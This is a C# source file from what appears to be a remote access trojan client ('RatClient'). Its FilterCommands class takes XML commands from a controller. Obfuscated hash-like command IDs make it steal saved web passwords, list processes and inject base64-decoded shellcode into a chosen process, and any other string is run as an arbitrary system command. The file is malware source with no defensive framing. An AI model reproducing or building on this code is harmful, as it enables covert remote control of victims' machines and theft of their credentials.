using RatClient.WebGather;
using RatClient.ProcManage;
using System;
using System.Xml;



namespace RatClient
{
    public class FilterCommands
    {
        public static XmlDocument xmlDoc;
        public FilterCommands()
        {
            xmlDoc = new XmlDocument();
        }
        public byte[] Run(string data)
        {
            xmlDoc.LoadXml(data);
            string command = xmlDoc.SelectSingleNode("/root/command").InnerText;
            if (command == string.Empty)
            {
                return null;
            }
            else if (command == "5df297c2f2da83a8b45cfd012fbf9b3c")
            {
                string type = xmlDoc.SelectSingleNode("/root/type").InnerText;
                string web = xmlDoc.SelectSingleNode("/root/web").InnerText;
                return Passwords.Gather(web, type);
            }
            else if (command == "be425fd08e9ea24230bac47493228ada")
            {
                return ProcInfo.GetFormatedProcesses();
            }
            else if (command == "aea87b24517d08c8ff13601406a0202e")
            {
                byte[] shellonBase = Convert.FromBase64String(xmlDoc.SelectSingleNode("/root/shellonbase").InnerText);
                int targetPid = int.Parse(xmlDoc.SelectSingleNode("/root/targetPid").InnerText);
                bool test = Tools.InjectProcess(shellonBase, procid: targetPid);
                if (test)
                {
                    return new byte[1] { 48 };
                }
                return new byte[1] { 49 };
            }
            else
            {
                return Tools.RunCommand(command);
            }
        } 
    }
}
